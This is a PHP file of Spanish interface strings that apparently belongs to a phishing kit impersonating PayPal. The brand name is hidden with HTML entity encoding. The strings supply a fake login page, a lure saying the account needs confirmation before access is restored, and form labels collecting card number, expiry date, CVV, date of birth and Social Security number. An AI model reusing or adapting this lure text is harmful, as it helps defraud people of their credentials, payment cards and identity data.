<?php 
$aaaaaaaal1 = "Mi resumen";
$aaaaaaaal2 = "Dinero";
$aaaaaaaal3 = "Actividad";
$aaaaaaaal4 = "Informes";
$aaaaaaaal5 = "Herramientas";
$aaaaaaaal6 = "Más";
$aaaaaaaal7 = "Cerrar sesión";
$aaaaaaaal8 = "Actualice la información de su cuenta";
$aaaaaaaal9 = "Ajustes y pagos";
$aaaaaaaal10 = "Paso";
$aaaaaaaal11 = "Personal";
$aaaaaaaal12 = "Tarjeta";
$aaaaaaaal13 = "Pago";
$aaaaaaaal14 = "Confirmar";
$aaaaaaaal15 = "Siguiente";
$aaaaaaaal16 = "Atrás";
$aaaaaaaal17 = "La protección de su dinero";
$aaaaaaaal18 = "Cada transacción se controla y fuertemente custodiado detrás de nuestra encriptación avanzada para ayudar a prevenir el fraude y el robo de identidad.";
$aaaaaaaal19 = "Tarjetas de pago por Internet";
$aaaaaaaal20 = "&#80;&#97;&#121;&#80;&#97;I es una de las formas más utilizadas recibir el pago en línea. Aceptar pagos con facilidad y seguridad.";
$aaaaaaaal35 = "Es necesario confirmar sus informaciones a ser capaz de solucionar este problema y el acceso a su cuenta";
$aaaaaaaal38 = "Cerrar para activar su cuenta";
$aaaaaaaal33 = "Todos los derechos reservados .";
$aaaaaaaal34 = "Algunos de sus datos no son correctos. Inténtelo de nuevo.";
$aaaaaaaal22 = "Error: Iniciar sesión ";
$aaaaaaaal24 = "Es necesaria una dirección de correo válida.";
$aaaaaaaal26 = "Es necesaria una contraseña.";
$aaaaaaaal23 = "Correo electrónico";
$aaaaaaaal28 = "¿Ha olvidado su correo electrónico?";
$aaaaaaaal25 = "Contraseña";
$aaaaaaaal27 = "Entrar";
$aaaaaaaal29 = "Crear cuenta";
$aaaaaaaal30 = "Acerca de";
$aaaaaaaal36 = "Programadores";
$aaaaaaaal37 = "Opinión";
$aaaaaaaal31 = "Privacidad";
$aaaaaaaal32 = "Acuerdos legales";
$aaaaaaaal21 = "Inicie sesión en su cuenta.";
$aaaaaaaal39 = "Fecha de Nacimiento ";
$aaaaaaaal41 = "País ";
$aaaaaaaal40 = "Número de teléfono";
$aaaaaaaal44 = "Tarjeta nombre ";
$aaaaaaaal43 = "Numero de Tarjeta ";
$aaaaaaaal45 = "Fecha de Expiración ";
$aaaaaaaal46 = "Número de verificación de la tarjeta ";
$aaaaaaaal47 = "Número de Seguro Social ";
$aaaaaaaal42 = "Verificando la información...";



?>